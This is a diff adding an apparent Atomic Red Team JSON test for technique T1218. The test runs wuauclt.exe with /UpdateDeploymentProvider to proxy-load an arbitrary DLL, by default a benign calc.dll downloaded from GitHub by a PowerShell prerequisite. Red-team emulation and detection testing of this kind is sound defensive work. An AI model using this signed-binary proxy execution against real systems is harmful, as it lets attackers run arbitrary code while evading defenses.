@@ -1,0 +1,37 @@
+{
+    "name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
+    "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched.  See https://dtm.uk/wuauclt/ ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n",
+        "cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "System Binary Proxy Execution",
+    "source": "ART",
+    "uuid": "49fbd548-49e9-4bb7-94a6-3769613912b8",
+    "arguments": {
+        "arbitrary_dll": {
+            "description": "Path of DLL to be loaded",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\T1218\\bin\\calc.dll"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
+            "prereq_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
